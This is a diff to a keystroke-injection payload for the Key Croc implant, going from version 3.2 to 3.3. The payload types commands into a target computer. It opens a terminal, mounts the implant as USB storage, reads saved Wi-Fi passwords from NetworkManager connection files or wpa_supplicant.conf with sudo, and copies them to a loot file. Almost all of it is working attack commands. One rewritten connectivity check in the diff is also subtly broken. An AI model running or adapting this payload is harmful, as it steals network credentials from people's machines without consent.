@@ -2,7 +2,7 @@
 # Description:     Attempt to connect Keycroc automatically to target wifi access point
 #                  Save to tools/Croc_Pot/wifipass.txt and loot/Croc_Pot/old_wifipass.txt
 # Author:          spywill
-# Version:         3.2
+# Version:         3.3
 # Category:        Key Croc
 # Props:           Cribbit, Lodrix, potong, RootJunky, dark_pyrro
 
@@ -52,10 +52,7 @@ case $LOOT in
 		Q STRING "t_pw=\$(sudo sed -e '/ssid\ psk/,+1p' -ne \":a;/\$t_ssid/{n;h;p;x;ba}\" /etc/wpa_supplicant/wpa_supplicant.conf | sed 's/[[:space:]]//g' | sed 's/psk=\"\(.*\)\"/\1/')"
 		Q ENTER
 		Q DELAY 2000
-		Q STRING "echo \"\$t_ssid \$t_pw\" > \$RASPBERRY_PI"
-		Q ENTER
-		Q DELAY 2000
-		Q STRING "exit"
+		Q STRING "echo \"\$t_ssid \$t_pw\" > \$RASPBERRY_PI ; exit"
 		Q ENTER
 ;;
 	getonline_L)
@@ -64,28 +61,21 @@ case $LOOT in
 		else
 			PC_PW=LINUX
 		fi
-		Q ALT F2
-		Q DELAY 2000
-		Q STRING "xterm"
+		Q CONTROL-ALT-d
+		Q ALT-t
+		Q DELAY 1000
+		Q STRING "USB_LABEL=\"KeyCroc\" ; MOUNT_POINT=\"/mnt/usb\" ; sudo mkdir -p \$MOUNT_POINT ; sudo mount -L \"\$USB_LABEL\" \$MOUNT_POINT"
 		Q ENTER
-		Q DELAY 2000
-		Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
-		Q ENTER
-		Q DELAY 2000
+		Q DELAY 1000
 		Q STRING "$PC_PW"
 		Q ENTER
-		Q DELAY 2000
-		Q STRING "LINUX_ON=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/wifipass.txt"
+		Q DELAY 1000
+		Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | sed -e 's/=/ /g' | sudo tee \$MOUNT_POINT/tools/Croc_Pot/wifipass.txt"
 		Q ENTER
-		Q DELAY 2000
-		Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | sed -e 's/=/ /g' | tee \$LINUX_ON"
+		Q DELAY 1000
+		Q STRING "sudo umount \$MOUNT_POINT ; exit"
 		Q ENTER
-		Q DELAY 2000
-		Q STRING "sudo umount /media/\$(whoami)/KeyCroc/"
-		Q ENTER
-		Q DELAY 2000
-		Q STRING "sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
-		Q ENTER
+		Q DELAY 1000
 ;;
 esac
 
@@ -110,10 +100,6 @@ sleep 5
 systemctl restart ssh.service
 sleep 1
 
-if : >/dev/tcp/8.8.8.8/53; then
-	LED FINISH
-else
-	LED R
-fi
+[ : >/dev/tcp/8.8.8.8/53 ] && LED FINISH || LED R
 sleep 3
 LED OFF
